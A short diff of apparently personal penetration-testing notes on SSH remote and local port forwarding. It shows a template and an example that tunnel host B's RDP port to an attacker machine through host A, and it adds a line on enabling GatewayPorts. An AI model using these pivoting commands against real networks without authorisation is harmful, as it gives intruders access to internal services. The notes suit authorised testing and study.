@@ -8,6 +8,8 @@ ssh -R [ATTACKER IP]:[ATTACKER PORT]:[B IP]:[B PORT] [ATTACKER IP]
 e.g:
 ssh -R 192.168.157.134:3390:192.168.157.137:3389 192.168.157.134
 Remote desktop port 3389 on B will connect to port 3390 on Attacker through A
+*To allow bind on 0.0.0.0, add "GatewayPorts yes" in "/etc/ssh/sshd_config"
+
 
 Local port forwarding: (Mo port o A)
 on A:
